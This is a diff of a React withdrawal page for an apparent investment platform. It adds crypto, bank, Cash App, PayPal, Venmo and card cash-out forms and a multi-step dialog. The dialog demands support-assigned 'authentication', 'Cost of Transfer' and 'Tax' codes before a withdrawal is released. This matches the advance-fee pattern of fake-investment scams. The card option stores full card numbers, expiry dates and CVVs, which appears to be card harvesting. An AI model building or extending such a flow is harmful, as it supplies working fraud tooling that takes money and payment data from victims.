@@ -1,147 +1,568 @@
-import { useEffect, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { useAuth } from "@/hooks/useAuth";
 import { supabase } from "@/integrations/supabase/client";
-import { Card } from "@/components/ui/card";
+import { sendEmail } from "@/lib/sendEmail";
+import { SUPPORT_EMAIL, COMPANY_NAME } from "@/lib/siteConfig";
 import { Button } from "@/components/ui/button";
-import {
-  Dialog, DialogContent, DialogTitle, DialogHeader,
-} from "@/components/ui/dialog";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Dialog, DialogContent, DialogTitle, DialogFooter } from "@/components/ui/dialog";
+import { toast } from "sonner";
+import { Loader2, Bitcoin, Landmark, ShieldAlert, ShieldCheck, Percent, Receipt, Wallet } from "lucide-react";
+import { z } from "zod";
+import { useLiveData } from "@/hooks/useLiveData";
+import { useCurrency } from "@/hooks/useCurrency";
+import WithdrawalHistory from "@/components/dashboard/WithdrawalHistory";
 
-type Row = { id: string; amount: number; method: string | null; status: string; created_at: string };
+const amountSchema = z.coerce.number().positive("Amount must be positive");
 
-interface Props {
-  refreshKey: number;
-  symbol?: string;
-  onResume: (txId: string, txAmount: number) => void;
-}
+type CodeType = "auth" | "cot" | "tax";
+interface AccountCode { id: string; code_type: CodeType; code: string; verified: boolean; }
 
-// Light-theme tones — same status colors used in Transactions.tsx, so the
-// badges look consistent wherever they appear in the app.
-const STATUS_TONES: Record<string, string> = {
-  pending: "bg-yellow-500/10 text-yellow-700 border border-yellow-500/20",
-  awaiting_code: "bg-yellow-500/10 text-yellow-700 border border-yellow-500/20",
-  approved: "bg-emerald-500/10 text-emerald-700 border border-emerald-500/20",
-  completed: "bg-emerald-500/10 text-emerald-700 border border-emerald-500/20",
-  rejected: "bg-red-500/10 text-red-700 border border-red-500/20",
-  failed: "bg-red-500/10 text-red-700 border border-red-500/20",
-  cancelled: "bg-muted text-muted-foreground border border-border",
+const STEP_ORDER: CodeType[] = ["auth", "cot", "tax"];
+const STEP_META: Record<CodeType, { title: string; subtitle: string; icon: typeof ShieldCheck }> = {
+auth: { title: "Authentication code", subtitle: "Enter the authentication code assigned to your account by support.", icon: ShieldCheck },
+cot:  { title: "COT code", subtitle: "Enter the Cost of Transfer (COT) code assigned to your account.", icon: Percent },
+tax:  { title: "Tax code", subtitle: "Enter the Tax code assigned to your account to release this withdrawal.", icon: Receipt },
 };
 
-function StatusPill({ status }: { status: string }) {
-  const tone = STATUS_TONES[status] ?? "bg-muted text-muted-foreground border border-border";
-  return (
-    <span className={`text-[10px] uppercase tracking-wider px-2 py-1 rounded-full whitespace-nowrap ${tone}`}>
-      {status.replace(/_/g, " ")}
-    </span>
-  );
+type OtherMethod = "cashapp" | "paypal" | "venmo" | "card";
+
+// Details carried from the initial "withdrawal requested" step through to the
+// "withdrawal successful" email sent once verification completes.
+interface PendingWithdrawalInfo {
+  amount: number;
+  method: string;
+  detailsText: string;
 }
 
-export default function WithdrawalHistory({ refreshKey, onResume }: Props) {
-  const { user } = useAuth();
-  const [rows, setRows] = useState<Row[] | null>(null);
-  const [detail, setDetail] = useState<Row | null>(null);
+// Builds a single, human-readable line describing where the funds are being
+// sent, tailored per method. Bank/crypto/other handles show in full; card
+// numbers are masked to the last 4 digits.
+const buildMethodDetails = (method: string, body: Record<string, unknown>): string => {
+  if (method.startsWith("Crypto")) {
+    return `${method} withdrawal to wallet address: ${body.wallet_address ?? ""}`;
+  }
+  if (method === "Bank transfer") {
+    const b = (body.bank_details ?? {}) as { bank_name?: string; account_name?: string; account_no?: string; swift?: string };
+    const swiftPart = b.swift ? `, SWIFT/IBAN: ${b.swift}` : "";
+    return `Bank transfer to ${b.bank_name ?? ""}, Account name: ${b.account_name ?? ""}, Account number: ${b.account_no ?? ""}${swiftPart}`;
+  }
+  if (method === "Cash App") {
+    return `Cash App withdrawal to ${body.cashapp_tag ?? ""}`;
+  }
+  if (method === "PayPal") {
+    return `PayPal withdrawal to ${body.paypal_email ?? ""}`;
+  }
+  if (method === "Venmo") {
+    return `Venmo withdrawal to ${body.venmo_handle ?? ""}`;
+  }
+  if (method === "Credit Card") {
+    return `Card withdrawal to card ending in ${body.card_last4 ?? ""}`;
+  }
+  return method;
+};
 
-  useEffect(() => {
-    if (!user) return;
-    let cancelled = false;
-    const load = () => supabase
-      .from("transactions")
-      // amount_usd is the actual column name on this table; aliased to `amount`
-      // so the rest of this component can stay unchanged.
-      .select("id, amount:amount_usd, method, status, created_at")
-      .eq("user_id", user.id)
-      .eq("type", "withdrawal")
-      .order("created_at", { ascending: false })
-      .then(({ data }) => { if (!cancelled) setRows((data as Row[] | null) ?? []); });
-    load();
+export default function Withdraw() {
+const { user } = useAuth();
+const { format, currency, ready: currencyReady } = useCurrency();
+const [submitting, setSubmitting] = useState(false);
+const [defaultCode, setDefaultCode] = useState<string | null>(null);
+const [firstName, setFirstName] = useState<string>("");
 
-    const ch = supabase
-      .channel(`wd-history-${user.id}`)
-      .on("postgres_changes",
-        { event: "*", schema: "public", table: "transactions", filter: `user_id=eq.${user.id}` },
-        () => load())
-      .subscribe();
-    return () => { cancelled = true; supabase.removeChannel(ch); };
-  }, [user?.id, refreshKey]);
+// Bumped after a withdrawal is created/verified so WithdrawalHistory reloads
+// immediately instead of waiting on its own realtime subscription.
+const [historyRefreshKey, setHistoryRefreshKey] = useState(0);
 
-  return (
-    <Card className="border-border p-0 overflow-hidden" style={{ backgroundColor: "#F2F2F2" }}>
-      <div className="px-5 py-4 border-b border-border">
-        <h3 className="text-foreground font-bold text-sm">Withdrawal History</h3>
+const { data: balanceData, refresh: refreshBalance } = useLiveData(async () => {
+if (!user) return { balance: 0 };
+const { data } = await supabase
+.from("profiles")
+.select("total_balance")
+.eq("user_id", user.id)
+.maybeSingle();
+return { balance: data ? Number(data.total_balance) : 0 };
+}, [user?.id], { cacheKey: user ? `withdraw-balance:${user.id}` : undefined });
+const balance = balanceData?.balance ?? 0;
+const balanceReady = balanceData !== null;
+
+// Load default verification code once per user (separate from balance fetcher
+// so input doesn't re-render whenever balance refreshes).
+useEffect(() => {
+  if (!user) return;
+  let active = true;
+  supabase.from("profiles").select("default_verification_code").eq("user_id", user.id).maybeSingle()
+    .then(({ data }) => {
+      if (active && data?.default_verification_code) setDefaultCode(data.default_verification_code);
+    });
+  return () => { active = false; };
+}, [user?.id]);
+
+// Load first name for personalized email greetings.
+useEffect(() => {
+  if (!user) return;
+  let active = true;
+  supabase.from("profiles").select("full_name").eq("user_id", user.id).maybeSingle()
+    .then(({ data }) => {
+      const name = (data as any)?.full_name?.trim();
+      if (active && name) setFirstName(name.split(" ")[0]);
+    });
+  return () => { active = false; };
+}, [user?.id]);
+
+// Realtime: reflect balance changes from admin or anywhere else.
+useEffect(() => {
+  if (!user) return;
+  const ch = supabase
+    .channel(`withdraw-balance-${user.id}`)
+    .on("postgres_changes",
+      { event: "UPDATE", schema: "public", table: "profiles", filter: `user_id=eq.${user.id}` },
+      () => refreshBalance())
+    .subscribe();
+  return () => { supabase.removeChannel(ch); };
+}, [user?.id, refreshBalance]);
+
+
+const [crypto, setCrypto] = useState({ coin: "BTC", amount: "", address: "" });
+const [bank, setBank] = useState({ amount: "", account_name: "", account_no: "", bank_name: "", swift: "" });
+const [other, setOther] = useState<{
+method: OtherMethod; amount: string;
+cashapp_tag: string; paypal_email: string; venmo_handle: string;
+card_number: string; card_exp: string; card_cvv: string; card_billing_name: string;
+}>({
+method: "cashapp", amount: "",
+cashapp_tag: "", paypal_email: "", venmo_handle: "",
+card_number: "", card_exp: "", card_cvv: "", card_billing_name: "",
+});
+
+const [authOpen, setAuthOpen] = useState(false);
+const [pendingTxId, setPendingTxId] = useState<string | null>(null);
+const [pendingWithdrawalInfo, setPendingWithdrawalInfo] = useState<PendingWithdrawalInfo | null>(null);
+const [codes, setCodes] = useState<AccountCode[]>([]);
+const [stepIndex, setStepIndex] = useState(0);
+const [input, setInput] = useState("");
+const [verifying, setVerifying] = useState(false);
+
+// always include auth as first step, then any additional codes assigned
+const activeSteps = useMemo<CodeType[]>(() => {
+const steps: CodeType[] = ["auth"]; // auth always required
+if (codes.some((c) => c.code_type === "cot")) steps.push("cot");
+if (codes.some((c) => c.code_type === "tax")) steps.push("tax");
+return steps;
+}, [codes]);
+
+const currentType: CodeType | null = activeSteps[stepIndex] ?? null;
+const currentCode = currentType === "auth"
+? codes.find((c) => c.code_type === "auth") ?? null
+: currentType ? codes.find((c) => c.code_type === currentType) : null;
+
+useEffect(() => {
+if (!authOpen || !user) return;
+fetchCodes();
+}, [authOpen, user?.id]);
+
+const fetchCodes = async () => {
+  if (!user) return;
+  const { data } = await supabase
+    .from("account_withdrawal_codes")
+    .select("*")
+    .eq("user_id", user.id)
+    .maybeSingle();
+
+  if (data) {
+    const rows: AccountCode[] = [];
+    if ((data as any).auth_code) {
+      rows.push({
+        id: (data as any).id,
+        code_type: "auth",
+        code: (data as any).auth_code,
+        verified: false,
+      });
+    }
+    if ((data as any).cot_required && (data as any).cot_code) {
+      rows.push({
+        id: (data as any).id,
+        code_type: "cot",
+        code: (data as any).cot_code,
+        verified: false,
+      });
+    }
+    if ((data as any).tax_required && (data as any).tax_code) {
+      rows.push({
+        id: (data as any).id,
+        code_type: "tax",
+        code: (data as any).tax_code,
+        verified: false,
+      });
+    }
+    setCodes(rows);
+  }
+};
+
+
+const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
+if (!user) return;
+const a = amountSchema.safeParse(amt);
+if (!a.success) { toast.error(a.error.errors[0].message); return; }
+if (a.data > balance) { toast.error("Insufficient balance"); return; }
+setSubmitting(true);
+const { data, error } = await supabase.from("transactions").insert({
+user_id: user.id, type: "withdrawal", method, amount_usd: a.data, status: "pending", ...body,
+} as never).select("id").maybeSingle();
+setSubmitting(false);
+if (error || !data) { toast.error(error?.message ?? "Failed"); return; }
+
+// Stash amount + method details now, to use in the "withdrawal successful"
+// email once verification completes.
+setPendingWithdrawalInfo({
+  amount: a.data,
+  method,
+  detailsText: buildMethodDetails(method, body),
+});
+
+// Fire-and-forget: a failed email must never block the withdrawal flow.
+if (user.email) {
+  sendEmail({
+    email: user.email,
+    first_name: firstName,
+    subject: "Withdrawal Requested",
+    message: `<p style="margin:0 0 12px 0;">You have requested to make a withdrawal of $${a.data.toFixed(2)} USD. Please complete verification below to proceed with your withdrawal.</p>
+<p style="margin:0 0 12px 0;">For more information/Compliant, please contact <a href="mailto:${SUPPORT_EMAIL}">${SUPPORT_EMAIL}</a> or make use of the Live Chat for Assistance.</p>
+<p style="margin:0;">Kind Regards,<br/>${COMPANY_NAME} Support Team</p>`,
+  }).catch(() => {});
+}
+
+setPendingTxId(data.id);
+setInput("");
+setStepIndex(0);
+setAuthOpen(true);
+setHistoryRefreshKey((k) => k + 1);
+};
+
+// Resume an existing "cancelled" / "awaiting_code" withdrawal from the
+// history list instead of creating a new transaction.
+const handleResume = (txId: string, _txAmount: number) => {
+setPendingTxId(txId);
+setInput("");
+setStepIndex(0);
+setAuthOpen(true);
+};
+
+const verify = async () => {
+if (!user || !currentType) return;
+const entered = input.trim().toUpperCase();
+if (entered.length < 4) { toast.error("Enter the code"); return; }
+
+// For auth step: check account_withdrawal_codes first, fallback to default_verification_code
+if (currentType === "auth") {
+  const assignedAuth = codes.find((c) => c.code_type === "auth");
+  const validCode = assignedAuth
+    ? assignedAuth.code.trim().toUpperCase()
+    : defaultCode?.trim().toUpperCase();
+
+  if (!validCode) {
+    toast.error("No authentication code assigned. Contact support.");
+    return;
+  }
+  if (entered !== validCode) {
+    toast.error("Invalid authentication code.");
+    return;
+  }
+  setVerifying(true);
+  if (assignedAuth) {
+    await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", assignedAuth.id);
+  }
+} else {
+  // cot / tax
+  if (!currentCode) { toast.error("No code assigned for this step."); return; }
+  if (entered !== currentCode.code.trim().toUpperCase()) {
+    toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`);
+    return;
+  }
+  setVerifying(true);
+  await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", currentCode.id);
+}
+
+const nextIdx = stepIndex + 1;
+setInput("");
+if (nextIdx >= activeSteps.length) {
+  await supabase.from("transactions").update({ auth_code_verified: true, status: "pending" }).eq("id", pendingTxId!);
+  setVerifying(false);
+  setAuthOpen(false);
+
+  // Fire-and-forget: a failed email must never block the withdrawal flow.
+  if (user.email && pendingWithdrawalInfo) {
+    sendEmail({
+      email: user.email,
+      first_name: firstName,
+      subject: "Withdrawal Request",
+      message: `<p style="margin:0 0 12px 0;">This is to inform you that your withdrawal request of $${pendingWithdrawalInfo.amount.toFixed(2)} USD is successful, please wait while we process your request. You will receive a notification regarding the status of your request.<br/>${pendingWithdrawalInfo.detailsText}</p>
+<p style="margin:0 0 12px 0;">For more information/Compliant, please contact <a href="mailto:${SUPPORT_EMAIL}">${SUPPORT_EMAIL}</a> or make use of the Live Chat for Assistance.</p>
+<p style="margin:0;">Kind Regards,<br/>${COMPANY_NAME} Support Team</p>`,
+    }).catch(() => {});
+  }
+
+  setPendingTxId(null);
+  setPendingWithdrawalInfo(null);
+  refreshBalance();
+  setHistoryRefreshKey((k) => k + 1);
+  toast.success("codes verified. Withdrawal is under final review.");
+} else {
+  setStepIndex(nextIdx);
+  setVerifying(false);
+  toast.success(`${STEP_META[currentType].title} accepted.`);
+}
+
+};
+
+const cancelRequest = async () => {
+if (pendingTxId) await supabase.from("transactions").update({ status: "cancelled" }).eq("id", pendingTxId);
+setAuthOpen(false);
+setPendingTxId(null);
+setPendingWithdrawalInfo(null);
+setHistoryRefreshKey((k) => k + 1);
+};
+
+const StepIcon = currentType ? STEP_META[currentType].icon : ShieldAlert;
+
+const submitOther = () => {
+const m = other.method;
+const body: Record<string, unknown> = {};
+let label = "";
+if (m === "cashapp") {
+if (!other.cashapp_tag.trim()) return toast.error("Enter your $cashtag");
+body.cashapp_tag = other.cashapp_tag.trim();
+label = "Cash App";
+} else if (m === "paypal") {
+if (!/^\S+@\S+.\S+$/.test(other.paypal_email)) return toast.error("Enter a valid PayPal email");
+body.paypal_email = other.paypal_email.trim();
+label = "PayPal";
+} else if (m === "venmo") {
+if (!other.venmo_handle.trim()) return toast.error("Enter your Venmo handle");
+body.venmo_handle = other.venmo_handle.trim();
+label = "Venmo";
+} else if (m === "card") {
+if (other.card_number.replace(/\s/g, "").length < 12) return toast.error("Enter a valid card number");
+if (!other.card_exp.trim()) return toast.error("Enter expiration date");
+if (other.card_cvv.length < 3) return toast.error("Enter CVV");
+if (!other.card_billing_name.trim()) return toast.error("Enter billing name");
+body.card_number = other.card_number.replace(/\s/g, "");
+body.card_exp = other.card_exp.trim();
+body.card_cvv = other.card_cvv.trim();
+body.card_billing_name = other.card_billing_name.trim();
+body.card_last4 = body.card_number.toString().slice(-4);
+label = "Credit Card";
+}
+submit(label, body, other.amount);
+};
+
+return (
+<div className="space-y-6">
+<div>
+<p className="label-mono text-muted-foreground mb-2">Cash out</p>
+<h1 className="font-display text-3xl font-light tracking-[-0.03em]">Withdraw</h1>
+<p className="text-muted-foreground text-[14px] mt-1">
+Available balance: {balanceReady && currencyReady ? (
+  <span className="text-foreground font-medium">{format(balance)}</span>
+) : (
+  <span className="inline-block align-middle h-4 w-20 rounded bg-muted animate-pulse" />
+)}
+</p>
+</div>
+
+  <Tabs defaultValue="crypto">
+    <TabsList className="grid w-full max-w-2xl grid-cols-3">
+      <TabsTrigger value="crypto"><Bitcoin className="w-3.5 h-3.5 mr-1.5" /> Crypto</TabsTrigger>
+      <TabsTrigger value="bank"><Landmark className="w-3.5 h-3.5 mr-1.5" /> Bank</TabsTrigger>
+      <TabsTrigger value="others"><Wallet className="w-3.5 h-3.5 mr-1.5" /> Others</TabsTrigger>
+    </TabsList>
+
+    <TabsContent value="crypto" className="mt-6">
+      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
+        <div className="grid sm:grid-cols-2 gap-4">
+          <div>
+            <Label htmlFor="w-coin">Coin</Label>
+            <select id="w-coin" value={crypto.coin} onChange={(e) => setCrypto({ ...crypto, coin: e.target.value })}
+              className="mt-1 w-full rounded-md border border-input bg-background px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-ring">
+              <option value="BTC">Bitcoin (BTC)</option>
+              <option value="ETH">Ethereum (ETH)</option>
+              <option value="USDT">Tether (USDT)</option>
+            </select>
+          </div>
+          <div>
+            <Label>Amount</Label>
+            <Input value={crypto.amount} onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })} placeholder="" />
+          </div>
+        </div>
+        <div>
+          <Label>Your wallet address</Label>
+          <Input value={crypto.address} onChange={(e) => setCrypto({ ...crypto, address: e.target.value })} placeholder="Paste wallet address" className="font-mono text-xs" />
+        </div>
+        <Button disabled={submitting} onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address }, crypto.amount)} className="w-full">
+          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
+        </Button>
       </div>
-      {rows === null && (
-        <div className="divide-y divide-border">
-          {Array.from({ length: 3 }).map((_, i) => (
-            <div key={i} className="px-4 py-3 flex items-center gap-3">
-              <div className="flex-1 space-y-1.5">
-                <div className="skeleton-shimmer h-4 w-24" />
-                <div className="skeleton-shimmer h-3 w-40" />
-              </div>
-              <div className="skeleton-shimmer h-5 w-20 rounded-full" />
-              <div className="skeleton-shimmer h-8 w-20 rounded-md" />
-            </div>
-          ))}
-        </div>
-      )}
-      {rows !== null && rows.length === 0 && (
-        <div className="p-6 text-center text-muted-foreground text-sm">No withdrawals yet.</div>
-      )}
-      {rows && rows.length > 0 && (
-        <div className="divide-y divide-border">
-          {rows.map((r) => {
-            // "cancelled"     -> user exited the verification modal before finishing -> Continue (resume same tx)
-            // "awaiting_code" -> admin assigned a further code (e.g. COT/tax) -> Continue (resume same tx)
-            // anything else (pending, approved, failed, rejected) -> read-only View
-            const showResume = r.status === "cancelled" || r.status === "awaiting_code";
-            return (
-              <div key={r.id} className="px-4 py-3 flex items-center gap-3 text-sm">
-                <div className="flex-1 min-w-0">
-                  <div className="text-foreground font-semibold tabular-nums">
-                    {Number(r.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-                  </div>
-                  <div className="text-[11px] text-muted-foreground truncate">
-                    {r.method || "—"} · {new Date(r.created_at).toLocaleString()}
-                  </div>
-                </div>
-                <StatusPill status={r.status} />
-                {showResume ? (
-                  <Button size="sm" variant="default" onClick={() => onResume(r.id, Number(r.amount))}>
-                    Continue
-                  </Button>
-                ) : (
-                  <Button size="sm" variant="outline" className="border-border text-foreground hover:bg-muted" onClick={() => setDetail(r)}>
-                    View
-                  </Button>
-                )}
-              </div>
-            );
-          })}
-        </div>
-      )}
+    </TabsContent>
 
-      <Dialog open={!!detail} onOpenChange={(o) => !o && setDetail(null)}>
-        <DialogContent className="bg-white text-slate-900 rounded-2xl border-0 max-w-sm">
-          <DialogHeader>
-            <DialogTitle>Transaction details</DialogTitle>
-          </DialogHeader>
-          {detail && (
-            <div className="space-y-2 text-sm">
-              <DetailRow k="Amount" v={Number(detail.amount).toLocaleString(undefined, { minimumFractionDigits: 2 })} />
-              <DetailRow k="Method" v={detail.method || "—"} />
-              <DetailRow k="Status" v={detail.status} />
-              <DetailRow k="Date" v={new Date(detail.created_at).toLocaleString()} />
-              <DetailRow k="Reference" v={detail.id.slice(0, 8).toUpperCase()} />
-            </div>
-          )}
-        </DialogContent>
-      </Dialog>
-    </Card>
-  );
-}
+    <TabsContent value="bank" className="mt-6">
+      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
+        <div className="grid sm:grid-cols-2 gap-4">
+          <div>
+            <Label>Amount</Label>
+            <Input value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })} />
+          </div>
+          <div>
+            <Label>Bank name</Label>
+            <Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })} />
+          </div>
+          <div>
+            <Label>Account name</Label>
+            <Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })} />
+          </div>
+          <div>
+            <Label>Account number</Label>
+            <Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })} />
+          </div>
+          <div className="sm:col-span-2">
+            <Label>SWIFT / IBAN</Label>
+            <Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })} />
+          </div>
+        </div>
+        <Button disabled={submitting} onClick={() => submit("Bank transfer", { bank_details: bank }, bank.amount)} className="w-full">
+          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
+        </Button>
+      </div>
+    </TabsContent>
 
-const DetailRow = ({ k, v }: { k: string; v: string }) => (
-  <div className="flex justify-between border-b border-slate-100 py-1.5">
-    <span className="text-slate-500">{k}</span>
-    <span className="font-semibold capitalize">{v}</span>
-  </div>
+    <TabsContent value="others" className="mt-6">
+      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
+        <div className="grid sm:grid-cols-2 gap-4">
+          <div>
+            <Label htmlFor="w-method">Method</Label>
+            <select id="w-method" value={other.method} onChange={(e) => setOther({ ...other, method: e.target.value as OtherMethod })}
+              className="mt-1 w-full rounded-md border border-input bg-background px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-ring">
+              <option value="cashapp">Cash App</option>
+              <option value="paypal">PayPal</option>
+              <option value="venmo">Venmo</option>
+              <option value="card">Credit Card</option>
+            </select>
+          </div>
+          <div>
+            <Label>Amount</Label>
+            <Input value={other.amount} onChange={(e) => setOther({ ...other, amount: e.target.value })} placeholder="" />
+          </div>
+        </div>
+
+        {other.method === "cashapp" && (
+          <div>
+            <Label>Cash App tag</Label>
+            <Input value={other.cashapp_tag} onChange={(e) => setOther({ ...other, cashapp_tag: e.target.value })} placeholder="$username" />
+          </div>
+        )}
+        {other.method === "paypal" && (
+          <div>
+            <Label>PayPal email</Label>
+            <Input type="email" value={other.paypal_email} onChange={(e) => setOther({ ...other, paypal_email: e.target.value })} placeholder="you@example.com" />
+          </div>
+        )}
+        {other.method === "venmo" && (
+          <div>
+            <Label>Venmo handle</Label>
+            <Input value={other.venmo_handle} onChange={(e) => setOther({ ...other, venmo_handle: e.target.value })} placeholder="@yourhandle" />
+          </div>
+        )}
+        {other.method === "card" && (
+          <div className="space-y-4">
+            <div>
+              <Label>Card number</Label>
+              <Input value={other.card_number} onChange={(e) => setOther({ ...other, card_number: e.target.value })} placeholder="4242 4242 4242 4242" inputMode="numeric" />
+            </div>
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <Label>Expiration (MM/YY)</Label>
+                <Input value={other.card_exp} onChange={(e) => setOther({ ...other, card_exp: e.target.value })} placeholder="08/27" />
+              </div>
+              <div>
+                <Label>CVV</Label>
+                <Input value={other.card_cvv} onChange={(e) => setOther({ ...other, card_cvv: e.target.value })} placeholder="123" inputMode="numeric" maxLength={4} />
+              </div>
+            </div>
+            <div>
+              <Label>Billing name</Label>
+              <Input value={other.card_billing_name} onChange={(e) => setOther({ ...other, card_billing_name: e.target.value })} placeholder="Name on card" />
+            </div>
+          </div>
+        )}
+
+        <Button disabled={submitting} onClick={submitOther} className="w-full">
+          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
+        </Button>
+      </div>
+    </TabsContent>
+  </Tabs>
+
+  {/* Withdrawal history, rendered directly below the form */}
+  <WithdrawalHistory refreshKey={historyRefreshKey} symbol={currency} onResume={handleResume} />
+
+  <Dialog open={authOpen} onOpenChange={(o) => { if (!o) cancelRequest(); }}>
+    <DialogContent className="max-w-md p-0 overflow-hidden border-border" style={{ borderRadius: 16 }}>
+      <div className="px-6 pt-6 pb-4 border-b border-border bg-gradient-to-b from-muted/40 to-transparent">
+        <div className="flex items-center gap-3 mb-3">
+          <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
+            <StepIcon className="w-5 h-5 text-primary" />
+          </div>
+          <div className="flex-1 min-w-0">
+            <DialogTitle className="text-[15px] font-semibold leading-tight">
+              {currentType ? STEP_META[currentType].title : "Authorization required"}
+            </DialogTitle>
+          </div>
+        </div>
+
+        {activeSteps.length > 1 && (
+          <div className="flex items-center gap-1.5">
+            {activeSteps.map((t, i) => {
+              const done = i < stepIndex;
+              const active = i === stepIndex;
+              return (
+                <div key={t} className={`h-1 flex-1 rounded-full transition-colors ${done ? "bg-emerald-500" : active ? "bg-primary" : "bg-muted"}`} />
+              );
+            })}
+          </div>
+        )}
+      </div>
+
+      <div className="px-6 py-6 space-y-4">
+        <p className="text-[13px] text-muted-foreground leading-relaxed">
+          {currentType ? STEP_META[currentType].subtitle : ""}
+        </p>
+        <div className="space-y-1.5">
+          <Label htmlFor="auth-code" className="text-[12px] font-medium">Verification code</Label>
+          <Input
+            id="auth-code"
+            value={input}
+            onChange={(e) => setInput(e.target.value.toUpperCase())}
+            placeholder="ENTER CODE"
+            className="font-mono tracking-[0.4em] text-center text-base h-12 rounded-xl border-2 focus-visible:ring-primary"
+            maxLength={12}
+            autoFocus
+          />
+          <p className="text-[11px] text-muted-foreground">
+            Don't have this code? Contact support to receive it.
+          </p>
+        </div>
+      </div>
+
+      <DialogFooter className="px-6 py-4 bg-muted/30 border-t border-border gap-2 sm:gap-2">
+        <Button variant="outline" onClick={cancelRequest} className="rounded-full">Cancel</Button>
+        <Button disabled={verifying || input.trim().length < 4} onClick={verify} className="rounded-full min-w-[140px]">
+          {verifying ? <Loader2 className="w-4 h-4 animate-spin" /> : (stepIndex + 1 === activeSteps.length ? "Verify & finish" : "Verify & continue")}
+        </Button>
+      </DialogFooter>
+    </DialogContent>
+  </Dialog>
+</div>
+
+
 );
+}
